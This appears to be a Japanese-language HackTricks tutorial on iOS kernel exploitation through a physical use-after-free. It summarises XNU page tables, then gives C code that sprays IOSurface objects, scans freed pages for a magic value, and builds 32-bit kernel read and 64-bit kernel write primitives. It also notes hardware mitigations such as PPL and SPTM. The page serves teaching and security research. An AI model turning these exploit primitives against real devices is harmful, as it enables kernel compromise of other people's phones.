# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

これは [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) の投稿を要約したものです。さらにこの手法を使ったエクスプロイトの詳細は [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd) にあります。

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

iOSのユーザプロセス向けの virtual memory address space は **0x0 から 0x8000000000** までです。ただし、これらのアドレスは physical memory に直接対応しているわけではありません。代わりに、**kernel** が **page tables** を使って virtual addresses を実際の **physical addresses** に変換します。

#### Levels of Page Tables in iOS

Page tables は階層化されており、3つのレベルで構成されます:

1. **L1 Page Table (Level 1)**:
* ここでの各エントリは仮想メモリの大きな範囲を表します。
* **0x1000000000 bytes**（**256 GB**）の仮想メモリをカバーします。
2. **L2 Page Table (Level 2)**:
* ここでのエントリはより小さな領域、具体的には **0x2000000 bytes**（32 MB）を表します。
* L1 エントリがその領域全体を直接マップできない場合、L2 テーブルへのポインタを指すことがあります。
3. **L3 Page Table (Level 3)**:
* これは最も細かいレベルで、各エントリが単一の **4 KB** ページをマップします。
* より細かい制御が必要な場合、L2 エントリは L3 テーブルを指すことがあります。

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* page table のいくつかのエントリは、仮想アドレスの範囲を連続する physical addresses に直接 **map** します（ショートカットのようなものです）。
* **Pointer to Child Page Table**:
* より細かい制御が必要な場合、あるレベルのエントリ（例: L1）は次のレベルの **child page table** を指すことができます（例: L2）。

#### Example: Mapping a Virtual Address

仮に仮想アドレス **0x1000000000** にアクセスしようとすると:

1. **L1 Table**:
* kernel はこの仮想アドレスに対応する L1 page table エントリをチェックします。もし **pointer to an L2 page table** があれば、L2 テーブルへ進みます。
2. **L2 Table**:
* kernel はより詳細なマッピングのために L2 page table をチェックします。もしこのエントリが **pointer to an L3 page table** を指していれば、さらに L3 へ進みます。
3. **L3 Table**:
* kernel は最終的な L3 エントリを参照し、それが実際のメモリページの **physical address** を指します。

#### Example of Address Mapping

もし L2 テーブルの最初のインデックスに physical address **0x800004000** を書き込んだ場合:

* 仮想アドレス **0x1000000000** から **0x1002000000** は物理アドレス **0x800004000** から **0x802004000** へマップされます。
* これは L2 レベルでの **block mapping** です。

また、L2 エントリが L3 テーブルを指す場合:

* 仮想アドレス範囲 **0x1000000000 -> 0x1002000000** の各 4 KB ページは L3 テーブルの個別エントリでマップされます。

### Physical use-after-free

A **physical use-after-free** (UAF) は次のような状況で発生します:

1. プロセスが読み書き可能としていくつかのメモリを **allocates** する。
2. **page tables** が更新され、そのメモリがプロセスからアクセス可能な特定の physical address にマップされる。
3. プロセスがそのメモリを **deallocates (free)** する。
4. しかし、**bug** のために kernel は page tables からその mapping を削除し忘れ、対応する physical メモリは free としてマークされる。
5. kernel はその「free」になった physical memory を他の用途（例: **kernel data**）のために **reallocate** する。
6. mapping が削除されていないため、プロセスはその physical memory を引き続き **read and write** できる。

つまり、プロセスは **kernel memory のページ** にアクセスできるようになり、そこには機密データや構造体が含まれている可能性があるため、攻撃者が **kernel memory を操作** できる恐れがあります。

### IOSurface Heap Spray

攻撃者は freed メモリにどの kernel ページが割り当てられるかを制御できないため、次のような **heap spray** 技法を使います:

1. 攻撃者は kernel memory 内に大量の IOSurface objects を **create** する。
2. 各 IOSurface object はそのフィールドの1つに **magic value** を含め、特定しやすくします。
3. 彼らは freed pages を **scan** して、その中にこれらの IOSurface objects が入っているかどうかを確認します。
4. freed page 上に IOSurface object を見つけた場合、それを使って **kernel memory の read/write** を行えます。

詳細は [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups) を参照してください。

> [!TIP]
> iOS 16+ (A12+) デバイスはハードウェア緩和策（PPL や SPTM など）を導入しており、physical UAF 技術の有効性を大幅に低下させています。
> PPL は code signing、entitlements、敏感な kernel data に関連するページに対して厳格な MMU 保護を課し、ページが再利用されても userland や compromised kernel code からの書き込みをブロックします。
> Secure Page Table Monitor (SPTM) は PPL を拡張し、page table の更新自体を強化します。これにより、特権を持つ kernel コードであっても secure checks を経ずに freed pages を再マップしたりマッピングを改竄したりすることができなくなります。
> KTRR (Kernel Text Read-Only Region) はブート後に kernel のコード領域を読み取り専用に固定します。これにより runtime による kernel code の変更が防がれ、physical UAF エクスプロイトが頼りにする主要な攻撃ベクトルが閉じられます。
> さらに、`IOSurface` の割り当ては予測しにくくなり、user-accessible な領域へマッピングするのが難しくなっているため、magic value をスキャンするトリックの信頼性が低下しています。`IOSurface` は現在 entitlements や sandbox 制限でも保護されています。

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: 攻撃者は特別な識別子（"magic value"）を持つ多くの IOSurface objects を作成します。
2. **Scan Freed Pages**: それらのオブジェクトのいずれかが freed page に割り当てられているかを確認します。
3. **Read/Write Kernel Memory**: IOSurface object のフィールドを操作することで、**arbitrary reads and writes** を kernel memory に対して実行できるようになります。これにより:
* あるフィールドを使って kernel memory の任意の 32-bit 値を **read** できる。
* 別のフィールドを使って 64-bit 値を **write** でき、安定した **kernel read/write primitive** を実現できる。

Generate IOSurface objects with the magic value IOSURFACE_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
1つの解放された物理ページ内で **`IOSurface`** オブジェクトを検索する:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### IOSurface を使ったカーネル読み書きの実現

カーネルメモリ上の IOSurface オブジェクトを制御できるようになった後（ユーザースペースからアクセス可能な解放済み物理ページにマップされている）、これを使って**任意のカーネル読み書き操作**が可能になる。

**IOSurface の重要なフィールド**

IOSurface オブジェクトには2つの重要なフィールドがある:

1. **Use Count Pointer**: **32-bit の読み取り**を可能にする。
2. **Indexed Timestamp Pointer**: **64-bit の書き込み**を可能にする。

これらのポインタを書き換えることで、カーネルメモリ内の任意のアドレスへリダイレクトでき、読み書きが可能になる。

#### 32-Bit Kernel Read

読み取りを行うには:

1. **use count pointer** を上書きし、対象アドレスから 0x14 バイトを引いた位置を指すようにする。
2. `get_use_count` メソッドを使い、そのアドレスの値を読み取る。
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64ビットカーネル書き込み

書き込みを行うには:

1. ターゲットアドレスに **インデックス付きタイムスタンプポインタ** を上書きする。
2. `set_indexed_timestamp` メソッドを使って64ビット値を書き込む。
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: 解放されたページが再利用可能になる。
2. **Spray IOSurface Objects**: カーネルメモリに一意の "magic value" を持つ多数の IOSurface オブジェクトを割り当てる。
3. **Identify Accessible IOSurface**: 制御下の解放ページ上の IOSurface を特定する。
4. **Abuse Use-After-Free**: IOSurface オブジェクト内のポインタを改変し、IOSurface methods 経由で任意の **kernel read/write** を可能にする。

これらのプリミティブにより、エクスプロイトはカーネルメモリに対する制御された **32-bit reads** と **64-bit writes** を提供する。さらなる jailbreak 手順では、より安定した read/write プリミティブが必要になり、追加の保護（例: 新しい arm64e デバイス上の PPL）を回避する必要がある場合がある。

{{#include ../../banners/hacktricks-training.md}}
